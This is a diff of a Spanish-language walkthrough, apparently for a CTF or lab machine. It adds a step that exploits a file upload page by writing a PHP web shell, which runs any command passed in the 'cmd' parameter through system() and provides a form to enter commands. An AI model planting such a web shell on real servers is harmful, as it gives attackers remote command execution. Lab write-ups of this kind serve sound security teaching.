@@ -31,5 +31,19 @@ No hay mucho que hacer aqui.
 Al entrar a ```/file_upload.php/```
 <img width="673" height="128" alt="image" src="https://github.com/user-attachments/assets/fa98bbc6-3830-4a65-af8b-2327c4512330" />
 
-Podemos ver que que nos deja subir un archivo, por lo que pasaremos a explotarlo.
+Podemos ver que que nos deja subir un archivo, por lo que pasaremos a explotar esta función.
+
+## Paso N3: Ejecutando código
+La idea es hacer que la página ejecute código php para desde ahí poder trabajar, por lo que creamos el script malicioso
+```
+echo '<?php        
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+<form method="GET">
+    <input type="text" name="cmd" placeholder="Escribe tu comando aquí" style="width:400px">
+    <input type="submit" value="Ejecutar">
+</form>' > script.php
+```
 
